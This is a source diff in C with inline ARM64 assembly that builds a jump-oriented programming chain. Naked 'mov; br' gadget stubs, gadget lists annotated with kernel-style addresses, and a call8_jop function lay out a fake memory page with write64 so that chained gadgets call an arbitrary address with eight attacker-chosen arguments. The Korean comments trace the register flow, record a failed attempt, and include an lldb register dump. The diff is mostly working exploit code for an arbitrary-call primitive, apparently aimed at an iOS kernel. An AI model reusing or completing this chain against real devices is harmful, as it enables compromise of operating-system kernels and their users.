@@ -58,23 +58,7 @@ __attribute__((naked)) void mov_x9_x15__br_x16(void) {
     );
 }
 
-//
-__attribute__((naked)) void mov_x16_x2__br_x3(void) {
-    __asm__ volatile (
-        "mov x16, x2\n"
-        "br x3\n"
-    );
-}
-
-//
-__attribute__((naked)) void mov_x14_x2__br_x3(void) {
-    __asm__ volatile (
-        "mov x14, x2\n"
-        "br x3\n"
-    );
-}
-
-//
+//FFFFFFF008A01918
 __attribute__((naked)) void mov_x1_x2__br_x3(void) {
     __asm__ volatile (
         "mov x1, x2\n"
@@ -82,43 +66,148 @@ __attribute__((naked)) void mov_x1_x2__br_x3(void) {
     );
 }
 
-//
-__attribute__((naked)) void mov_x10_x14__br_x16(void) {
-    __asm__ volatile (
-        "mov x10, x14\n"
-        "br x16\n"
-    );
-}
-
-//
-__attribute__((naked)) void mov_x7_x8__br_x10(void) {
-    __asm__ volatile (
-        "mov x7, x8\n"
-        "br x10\n"
-    );
-}
-
-//
-__attribute__((naked)) void mov_x1_x9__br_x13(void) {
-    __asm__ volatile (
-        "mov x1, x9\n"
-        "br x13\n"
-    );
-}
-
-//
-__attribute__((naked)) void mov_x13_x14__br_x16(void) {
-    __asm__ volatile (
-        "mov x13, x14\n"
-        "br x16\n"
-    );
-}
-
-//
+//FFFFFFF008E43614
 __attribute__((naked)) void mov_x4_x8__br_x10(void) {
     __asm__ volatile (
         "mov x4, x8\n"
         "br x10\n"
+    );
+}
+
+//mov x16, x1 ; br x2
+__attribute__((naked)) void mov_x16_x1__br_x2(void) {
+    __asm__ volatile (
+        "mov x16, x1\n"
+        "br x2\n"
+    );
+}
+
+//mov x2, x8 ; br x3
+__attribute__((naked)) void mov_x2_x8__br_x3(void) {
+    __asm__ volatile (
+        "mov x2, x8\n"
+        "br x3\n"
+    );
+}
+
+//mov x16, x14 ; br x3
+__attribute__((naked)) void mov_x16_x14__br_x3(void) {
+    __asm__ volatile (
+        "mov x16, x14\n"
+        "br x3\n"
+    );
+}
+
+//mov x14, x3 ; br x4
+__attribute__((naked)) void mov_x14_x3__br_x4(void) {
+    __asm__ volatile (
+        "mov x14, x3\n"
+        "br x4\n"
+    );
+}
+
+//mov x16, x11 ; br x3
+__attribute__((naked)) void mov_x16_x11__br_x3(void) {
+    __asm__ volatile (
+        "mov x16, x11\n"
+        "br x3\n"
+    );
+}
+
+//mov x14, x11 ; br x15
+__attribute__((naked)) void mov_x14_x11__br_x15(void) {
+    __asm__ volatile (
+        "mov x14, x11\n"
+        "br x15\n"
+    );
+}
+
+//mov x10, x0 ; br x2
+__attribute__((naked)) void mov_x10_x0__br_x2(void) {
+    __asm__ volatile (
+        "mov x10, x0\n"
+        "br x2\n"
+    );
+}
+
+//mov x14, x1 ; br x2
+__attribute__((naked)) void mov_x14_x1__br_x2(void) {
+    __asm__ volatile (
+        "mov x14, x1\n"
+        "br x2\n"
+    );
+}
+
+//mov x12, x0 ; br x2
+__attribute__((naked)) void mov_x12_x0__br_x2(void) {
+    __asm__ volatile (
+        "mov x12, x0\n"
+        "br x2\n"
+    );
+}
+
+//mov x16, x15 ; br x12
+__attribute__((naked)) void mov_x16_x15__br_x12(void) {
+    __asm__ volatile (
+        "mov x16, x15\n"
+        "br x12\n"
+    );
+}
+
+//mov x7, x16 ; br x10
+__attribute__((naked)) void mov_x7_x16__br_x10(void) {
+    __asm__ volatile (
+        "mov x7, x16\n"
+        "br x10\n"
+    );
+}
+
+//mov x10, x0 ; br x12
+__attribute__((naked)) void mov_x10_x0__br_x12(void) {
+    __asm__ volatile (
+        "mov x10, x0\n"
+        "br x12\n"
+    );
+}
+
+//mov x8, x10 ; br x12
+__attribute__((naked)) void mov_x8_x10__br_x12(void) {
+    __asm__ volatile (
+        "mov x8, x10\n"
+        "br x12\n"
+    );
+}
+
+//mov x11, x10 ; br x12
+__attribute__((naked)) void mov_x11_x10__br_x12(void) {
+    __asm__ volatile (
+        "mov x11, x10\n"
+        "br x12\n"
+    );
+}
+
+
+//mov x13, x14 ; br x12
+__attribute__((naked)) void mov_x13_x14__br_x12(void) {
+    __asm__ volatile (
+        "mov x13, x14\n"
+        "br x12\n"
+    );
+}
+
+//mov x13, x2 ; br x12
+__attribute__((naked)) void mov_x13_x2__br_x12(void) {
+    __asm__ volatile (
+        "mov x13, x2\n"
+        "br x12\n"
+    );
+}
+
+//mov x4, x13 ; br x15
+__attribute__((naked)) void mov_x4_x13__br_x15(void) {
+    __asm__ volatile (
+        "mov x4, x13\n"
+        "br x15\n"
     );
 }
 
@@ -201,27 +290,279 @@ uint32_t my_call6(uint64_t addr, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t
     return ret;
 }
 
+/*
+
+mov x0, x12 ; br x10
+mov x1, x21 ; br x10
+mov x11, x19 ; br x10
+mov x12, x14 ; br x10
+mov x12, x9 ; br x10
+mov x15, x0 ; br x10
+mov x15, x16 ; br x10
+mov x15, x3 ; br x10
+mov x2, x1 ; br x10
+mov x3, x8 ; br x10
+mov x4, x3 ; br x10 
+mov x4, x8 ; br x10 vv
+mov x5, x15 ; br x10
+mov x5, x8 ; br x10
+mov x7, x16 ; br x10 v
+mov x7, x8 ; br x10
+mov x8, x11 ; br x10
+mov x8, x9 ; br x10
+mov x9, x11 ; br x10
+mov x9, x4 ; br x10
+mov x9, x8 ; br x10
+
+mov x0, x11 ; br x12
+mov x0, x15 ; br x12
+mov x10, x0 ; br x12 vv mov_x10_x0__br_x12
+mov x10, x11 ; br x12
+mov x10, x13 ; br x12
+mov x10, x19 ; br x12
+mov x10, x9 ; br x12
+mov x11, x10 ; br x12 vvv
+mov x11, x14 ; br x12
+mov x11, x9 ; br x12
+mov x13, x14 ; br x12
+mov x13, x2 ; br x12 vvvv
+mov x14, x13 ; br x12
+mov x14, x16 ; br x12 vvv
+mov x15, x16 ; br x12
+mov x16, x15 ; br x12 v
+mov x3, x15 ; br x12
+mov x5, x0 ; br x12
+mov x8, x10 ; br x12 vv mov_x8_x10__br_x12
+mov x9, x10 ; br x12 vvv
+mov x9, x11 ; br x12
+mov x9, x17 ; br x12
+mov x9, x2 ; br x12
+
+mov x0, x1 ; br x2 
+mov x0, x8 ; br x2
+mov x0, x9 ; br x2
+mov x1, x14 ; br x2
+mov x1, x16 ; br x2
+mov x1, x8 ; br x2 
+mov x10, x0 ; br x2 v
+mov x12, x0 ; br x2 v
+mov x14, x1 ; br x2 x
+mov x16, x1 ; br x2 x
+mov x17, x16 ; br x2
+
+mov x0, x8 ; br x3
+mov x1, x0 ; br x3
+mov x1, x2 ; br x3
+mov x1, x8 ; br x3
+mov x1, x9 ; br x3
+mov x15, x2 ; br x3 v
+mov x16, x11 ; br x3
+mov x16, x14 ; br x3
+mov x2, x1 ; br x3
+mov x2, x15 ; br x3 v
+mov x2, x8 ; br x3
+
+*/
+
+//mov_x15_x2__br_x3 ok
+
+//mov_x9_x15__br_x16 ok
+
+//mov_x16_x2__br_x3 
+//-> mov x0, x1 ; br x2
+//-> mov x1, x2 ; br x3
+
+//mov_x14_x2__br_x3
+
+//mov_x1_x2__br_x3
+
+//mov_x10_x14__br_x16 
+//-> mov x11, x10 ; br x0, 
+//mov x11, x13 ; br x0, 
+//mov x11, x17 ; br x0, 
+//mov x11, x8 ; br x0, 
+//mov x13, x11 ; br x0,
+//mov x13, x16 ; br x0
+//mov x14, x17 ; br x0
+//mov x15, x11 ; br x0
+//mov x15, x14 ; br x0
+//mov x15, x19 ; br x0
+//mov x16, x17 ; br x0
+//mov x19, x11 ; br x0
+//mov x26, x27 ; br x0
+//mov x27, x15 ; br x0
+
+//mov_x7_x8__br_x10
+
+//mov_x1_x9__br_x13
+
+//mov_x13_x14__br_x16
+
+//mov_x4_x8__br_x10
+
 uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7) {
     write64(my_page, my_page);
     write64(my_page + 0x98, my_page);
     write64(my_page + 0x7c0, gadget_populate + 4);
 
-    //SUMMARY: 추후 x16을 통해 br x16으로 gadget_populate 호출할 예정.
-    //
     //gadget_populate + 4 함수에서 진입했을때, 다음 레지스터 참조. (주석 참고) 
-    //이후에 br x4 문은 my_call6의 a5 참조 (a5 = mov_x16_x2__br_x3)
+    //이후에 br x4 문은 my_call6의 a5 참조 (a5 = mov_x15_x2__br_x3)
     write64(my_page + 0x100, 0);
     write64(my_page + 0x108, 0);
     write64(my_page + 0x110, my_page + 0x800);  //x1 = x8
-    write64(my_page + 0x118, gadget_populate);  //x2
+    write64(my_page + 0x118, x7);               //x2
     write64(my_page + 0x120, gadget_populate);  //x3
 
+    //mov_x15_x2__br_x3
+    //이제 x15 = x2 (call8_jop's x7)
+    //x3에 의해 gadget_populate으로 분기;
+
+    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
+    //이후에 br x4 문은 mov_x12_x0__br_x2으로 분기
+    uint64_t current_page = my_page + 0x800;
+    write64(current_page, mov_x12_x0__br_x2);   //x4
+    write64(current_page + 0x8, gadget_populate);                    //x0
+    write64(current_page + 0x10, current_page + 0x40);      //x1 = x8
+    write64(current_page + 0x18, gadget_populate);      //x2
+    write64(current_page + 0x20, 0);      //x3
+
+    //mov_x12_x0__br_x2
+    //x12에 gadget_populate 주소 백업 후 populate 복귀.
+
+    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
+    //이후에 br x4 문은 mov_x10_x0__br_x2으로 분기
+    current_page += 0x40;
+    write64(current_page, mov_x10_x0__br_x2);   //x4
+    write64(current_page + 0x8, gadget_populate);           //x0
+    write64(current_page + 0x10, current_page + 0x40);      //x1 = x8
+    write64(current_page + 0x18, gadget_populate);      //x2
+    write64(current_page + 0x20, 0);      //x3
+
+    //mov_x10_x0__br_x2
+    //x10에 gadget_populate 주소 백업 후 populate 복귀. 
+
+    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
+    //이후에 br x4 문은 mov_x16_x15__br_x12으로 분기
+    current_page += 0x40; 
+    write64(current_page, mov_x16_x15__br_x12);   //x4
+    write64(current_page + 0x8, gadget_populate);           //x0
+    write64(current_page + 0x10, current_page + 0x40);      //x1 = x8
+    write64(current_page + 0x18, gadget_populate);      //x2
+    write64(current_page + 0x20, 0);      //x3
+
+    //mov_x16_x15__br_x12
+    //x16 = x15 (jop's x7), populate 복귀.
+
+    // (lldb) reg read
+    // General Purpose Registers:
+    //         x0 = 0x00000001000034b4  jop3`gadget_populate
+    //         x1 = 0x000000015b00ab00
+    //         x2 = 0x00000001000034b4  jop3`gadget_populate
+    //         x3 = 0x0000000000000000
+    //         x4 = 0x00000001000035ac  jop3`mov_x7_x16__br_x10
+    //         x5 = 0xdeadbeef41424345
+    //         x6 = 0xdeadbeef41424346
+    //         x7 = 0xdeadbeef41424347
+
+    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
+    //이후에 br x4 문은 mov_x7_x16__br_x10으로 분기
+    current_page += 0x40; 
+    write64(current_page, mov_x7_x16__br_x10);   //x4
+    write64(current_page + 0x8, gadget_populate);           //x0
+    write64(current_page + 0x10, current_page + 0x40);      //x1 = x8
+    write64(current_page + 0x18, gadget_populate);      //x2
+    write64(current_page + 0x20, 0);      //x3
+
+    //mov_x7_x16__br_x10
+    //x7 = x16 (jop's x7), populate 복귀
+
+    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
+    //이후에 br x4 문은 mov_x10_x0__br_x12으로 분기
+    current_page += 0x40; 
+    write64(current_page, mov_x10_x0__br_x12);   //x4
+    write64(current_page + 0x8, x4);           //x0
+    write64(current_page + 0x10, current_page + 0x40);      //x1 = x8
+    write64(current_page + 0x18, gadget_populate);      //x2
+    write64(current_page + 0x20, 0);      //x3
+
+    //mov_x10_x0__br_x12
+    //x10 = x0 (jop's x4), populate 복귀
+
+    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
+    //이후에 br x4 문은 mov_x13_x2__br_x12으로 분기
+    current_page += 0x40; 
+    write64(current_page, mov_x13_x2__br_x12);   //x4
+    write64(current_page + 0x8, gadget_populate);           //x0
+    write64(current_page + 0x10, current_page + 0x40);      //x1 = x8
+    write64(current_page + 0x18, x4);      //x2
+    write64(current_page + 0x20, 0);      //x3
+
+    //mov_x8_x10__br_x12 (실패)
+    //x8 = x10 (jop's x4). populate 복귀.
+    //이는 추후, mov_x4_x8__br_x10 을 통해 x10에서 addr 호출할 예정.
+    //그러나, 마지막 write64(current_page + 0x10, x1);      //x1 = x8 에서 충돌함.
+
+    //mov_x13_x2__br_x12
+    //x13 = x2 (jop's x4), populate 복귀.
+
+    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
+    //이후에 br x4 문은 mov_x15_x2__br_x3으로 분기
+    current_page += 0x40; 
+    write64(current_page, mov_x15_x2__br_x3);   //x4
+    write64(current_page + 0x8, gadget_populate);           //x0
+    write64(current_page + 0x10, current_page + 0x40);      //x1 = x8
+    write64(current_page + 0x18, addr);      //x2
+    write64(current_page + 0x20, gadget_populate);      //x3
+    
+    //mov_x15_x2__br_x3
+    //x15 = x2 (jop's addr), populate 복귀.
+
+    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
+    current_page += 0x40; 
+    write64(current_page, mov_x4_x13__br_x15);   //x4
+    write64(current_page + 0x8, x0);           //x0
+    write64(current_page + 0x10, x1);      //x1 = x8
+    write64(current_page + 0x18, x2);      //x2
+    write64(current_page + 0x20, x3);      //x3
+
+
+    
+
+
+
+#if 0
+
+    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
+    //이후에 br x4 문은 mov_x10_x0__br_x12으로 분기
+    current_page += 0x40; 
+    write64(current_page, mov_x10_x0__br_x12);   //x4
+    write64(current_page + 0x8, addr);           //x0
+    write64(current_page + 0x10, current_page + 0x40);      //x1 = x8
+    write64(current_page + 0x18, gadget_populate);      //x2
+    write64(current_page + 0x20, 0);      //x3
+
+    //mov_x10_x0__br_x12
+    //x10 = x0 (addr), addr 호출 준비 완료.
+    //x12에 의해 populate 복귀.
+
+    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
+    //이후에 br x4 문은 mov_x4_x8__br_x10으로 분기
+    current_page += 0x40; 
+    write64(current_page, mov_x4_x8__br_x10);   //x4
+    write64(current_page + 0x8, x0);           //x0
+    write64(current_page + 0x10, x1);      //x1 = x8
+    write64(current_page + 0x18, x2);      //x2
+    write64(current_page + 0x20, x3);      //x3
+#endif
+
+
+
+
+#if 0 
     //mov_x16_x2__br_x3 실행했을 때, 
     //이제 x16 = x2 (gadget_populate), //(P1)
     //x3에 의해 gadget_populate로 분기;
 
-    //SUMMARY2: call8_jop's x1 값을 x15, 그리고 x9에 잠시 백업. 
-    //
     //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
     //이후에 br x4 문은 mov_x15_x2__br_x3으로 분기
     write64(my_page + 0x800, mov_x15_x2__br_x3);    //x4
@@ -238,8 +579,6 @@ uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_
     //이제 x9 = x15 (call8_jop's x1)    //(P7)
     //x16(P1)에 의해 gadget_populate으로 분기;
 
-    //SUMMARY3: 추후 x16을 통해 br x16으로 gadget_populate 호출할 예정. (왜 한번 더? 왠지 불필요할 것 같음)
-    //
     //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
     //이후에 br x4 문은 mov_x16_x2__br_x3으로 분기
     write64(my_page + 0x840, mov_x16_x2__br_x3);    //x4
@@ -252,9 +591,6 @@ uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_
     //이제 x16 = x2 (gadget_populate)   //(P2)
     //x3에 의해 gadget_populate으로 분기;
 
-    //SUMMARY4: mov_x1_x2__br_x3 주소를 x14, 그리고 x10에 잠시 백업.
-    //Why?  ... 이후엔 x16에 의해 populate으로 복귀.
-    //
     //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
     //이후에 br x4 문은 mov_x14_x2__br_x3으로 분기
     write64(my_page + 0x880, mov_x14_x2__br_x3);    //x4
@@ -271,8 +607,6 @@ uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_
     //이제 x10 = x14 (mov_x1_x2__br_x3) //(P3)
     //x16(P2)에 의해 gadget_populate으로 분기;
 
-    //SUMMARY5: x7에 이제 call8_jop's x7이 들어감
-    //
     //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
     //이후에 br x4 문은 mov_x7_x8__br_x10으로 분기
     write64(my_page + 0x8c0, mov_x7_x8__br_x10);    //x4
@@ -289,8 +623,6 @@ uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_
     //이제 x1 = x2 (my_page + 0x900)
     //x3에 의해 gadget_populate으로 분기;
 
-    //SUMMARY6: populate 주소가 x16에 백업
-    //
     //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
     //이후에 br x4 문은 mov_x16_x2__br_x3으로 분기
     write64(my_page + 0x900, mov_x16_x2__br_x3);    //x4
@@ -303,10 +635,8 @@ uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_
     //이제 x16 = x2 (gadget_populate)   //(P4)
     //x3에 의해 gadget_populate으로 분기;
 
-    //SUMMARY7: mov_x1_x9__br_x13 주소가 x14, 그리고 x10에 백업.
-    //
     //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
-    //이후에 br x4 문은 mov_x14_x2__br_x3으로 분기
+    //이후에 br x4 문은mov_x14_x2__br_x3으로 분기
     write64(my_page + 0x940, mov_x14_x2__br_x3);    //x4
     write64(my_page + 0x948, 0);                    //
     write64(my_page + 0x950, my_page + 0x980);      //x1 = x8
@@ -321,8 +651,6 @@ uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_
     //이제 x10 = x14 (mov_x1_x9__br_x13)    //(P6)
     //x16(P4)에 의해 gadget_populate으로 분기;
 
-    //SUMMARY8: populate 주소가 x16에 백업
-    //
     //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
     //이후에 br x4 문은 mov_x16_x2__br_x3으로 분기
     write64(my_page + 0x980, mov_x16_x2__br_x3);    //x4
@@ -335,8 +663,6 @@ uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_
     //이제 x16 = x2 (gadget_populate)   //(P5)
     //x3에 의해 gadget_populate으로 분기;
 
-    //SUMMARY10: addr이 x14, 그리고 x13에 백업.
-    //
     //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
     //이후에 br x4 문은 mov_x14_x2__br_x3으로 분기
     write64(my_page + 0x9C0, mov_x14_x2__br_x3);    //x4
@@ -353,11 +679,6 @@ uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_
     //이제 x13 = x14 (addr) //(P8)
     //x16(P5)에 의해 gadget_populate으로 분기;
 
-    //SUMMARY11: x0, x1과 x8, x2, x3엔 각각 call8_jop's x0, x4, x2, x3이 들어감.
-    //그런데, mov_x4_x8__br_x10에 의해 x4에 jop's x4가 들어가고,
-    //x10에 백업해둔 mov_x1_x9__br_x13 주소로 인해 분기.
-    //따라서 x1에 jop's x1이 들어가고, x13에 의해 addr로 분기.
-    //
     //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
     //이후에 br x4 문은 mov_x4_x8__br_x10으로 분기
     write64(my_page + 0xA00, mov_x4_x8__br_x10);    //x4
@@ -373,9 +694,10 @@ uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_
     //mov_x1_x9__br_x13
     //이제 x1 = x9 (call8_jop's x1 (P7))
     //x13(P8)에 의해 addr로 분기
+#endif
 
     uint64_t STORED_RET = my_page + 0x100;
-    uint64_t ret2 = my_call6(gadget_prologue, my_page, STORED_RET, 0, 0, mov_x16_x2__br_x3, x5, x6);
+    uint64_t ret2 = my_call6(gadget_prologue, my_page, STORED_RET, 0, 0, mov_x15_x2__br_x3, x5, x6);
 
     // hexdump(my_page, 0x1000);
 
